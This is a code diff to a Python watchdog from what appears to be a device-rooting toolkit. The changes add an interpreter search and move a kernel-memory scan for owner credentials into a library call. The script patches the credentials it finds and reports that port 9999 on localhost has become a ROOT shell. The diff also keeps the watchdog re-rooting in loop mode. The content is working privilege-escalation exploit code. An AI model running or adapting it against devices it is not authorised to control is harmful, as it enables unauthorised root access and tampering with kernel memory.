@@ -26,6 +26,7 @@ Usage:
 """
 import argparse
 import os
+import shutil
 import socket
 import struct
 import subprocess
@@ -44,13 +45,26 @@ import kernel_root as K      # noqa: E402
 INIT_V, INIT_P = 0xC0957180, 0x20957180
 OFF = 0x23C
 SCAN_START, SCAN_STOP = 0x20000000, 0x40000000
-PAT = struct.pack("<8I", 5001, 100, 5001, 100, 5001, 100, 5001, 100)
 STATE = TOOLS / "state"
 LOG = STATE / "rootwatch.log"
 SERVER_DIR = ROOT / "server"
-PYSRV = Path(os.environ.get(
-    "TVWATCH_PYSRV",
-    r"C:\Users\Raghav\AppData\Local\Python\pythoncore-3.14-64\pysrv.exe"))
+
+
+def find_python():
+    """Interpreter for server.py: env override, then pysrv.exe, then PATH.
+
+    Hardcoding the author's renamed copy made the watchdog useless on any other
+    host (the v10 design is host-independent); root.ps1's Find-Python is the
+    model - a firewall may require a renamed interpreter, so try that first but
+    never require it.
+    """
+    cands = [os.environ.get("TVWATCH_PYSRV"), os.environ.get("TVWATCH_PYTHON"),
+             shutil.which("pysrv.exe"), shutil.which("python"),
+             shutil.which("python3")]
+    for c in cands:
+        if c and Path(c).exists():
+            return Path(c)
+    return None
 
 
 def log(msg):
@@ -72,20 +86,21 @@ def port_open(port, host="127.0.0.1"):
 def ensure_server():
     if port_open(80):
         return True
-    if not (SERVER_DIR / "server.py").is_file() or not PYSRV.exists():
+    py = find_python()
+    if not (SERVER_DIR / "server.py").is_file() or py is None:
         log(f"server: cannot start (server.py present="
-            f"{(SERVER_DIR / 'server.py').is_file()}, pysrv={PYSRV})")
+            f"{(SERVER_DIR / 'server.py').is_file()}, python={py})")
         return False
     logs = SERVER_DIR / "logs"
     logs.mkdir(parents=True, exist_ok=True)
     out = open(logs / "server.out", "a", encoding="utf-8")
     err = open(logs / "server.err", "a", encoding="utf-8")
-    subprocess.Popen([str(PYSRV), "server.py"], cwd=str(SERVER_DIR),
+    subprocess.Popen([str(py), "server.py"], cwd=str(SERVER_DIR),
                      stdout=out, stderr=err,
                      creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
     for _ in range(20):
         if port_open(80):
-            log("server: started on :80")
+            log(f"server: started on :80 ({py.name})")
             return True
         time.sleep(0.25)
     log("server: DID NOT start (see server/logs/server.err)")
@@ -132,20 +147,8 @@ def root_by_tail(rpc):
 
 def root_by_cred_scan(rpc):
     """Content scan for owner creds; list-independent. Returns count patched."""
-    hits = set()
-    page = SCAN_START
-    while page < SCAN_STOP:
-        count = min(4096, (SCAN_STOP - page) // 0x1000)
-        for p, data in rpc.readmany(page, count):
-            if data is None:
-                continue
-            i = data.find(PAT)
-            while i >= 0:
-                hits.add(p + i - 4)
-                i = data.find(PAT, i + 1)
-        page += count * 0x1000
     patched = 0
-    for cred in sorted(hits):
+    for cred in K.iter_owner_creds(rpc, SCAN_START, SCAN_STOP):
         try:
             usage = T.u32(rpc.read(cred, 4))
         except Exception:
@@ -203,8 +206,11 @@ def main():
                     if send_shell(rpc):
                         log("op5 sent - 127.0.0.1:9999 is now a ROOT shell "
                             "(drive it with tools/root_shell.py or recon sh5 attach)")
-                        return 0
-                if args.once:
+                        if args.once:
+                            return 0
+                        # loop mode: the stub is consumed by op 5, so keep
+                        # watching instead of exiting after the first success
+                elif args.once:
                     return 0
             else:
                 log("stub found but not rooted (will retry)")
